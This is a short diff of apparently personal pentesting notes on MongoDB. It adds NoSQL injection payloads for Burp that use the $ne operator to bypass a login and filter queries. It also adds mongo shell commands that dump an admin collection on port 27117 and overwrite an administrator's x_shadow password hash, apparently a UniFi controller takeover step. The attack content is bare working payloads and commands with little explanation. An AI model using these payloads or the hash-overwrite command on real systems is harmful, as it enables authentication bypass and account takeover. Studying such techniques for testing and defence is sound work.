@@ -1,5 +1,4 @@
-mongodb cli:
-
+# mongodb cli:
 > use DATABASE_NAME
 > db.createCollection("users")
 > db.createCollection("roles")
@@ -39,8 +38,10 @@ $ne = no equal
         "password" : "password1!"
 }
 
-mongo en burp:
-
+# mongo en burp:
 GET /search?username[$ne]=user&role[$ne]=user HTTP/1.1
 username=admin&password[$ne]=admin
         
+# mongodb enumeration
+mongo --port 27117 ace --eval "db.admin.find().pretty()" --> db enum
+mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"SHA_512 Hash Generated"}}) --> update user password
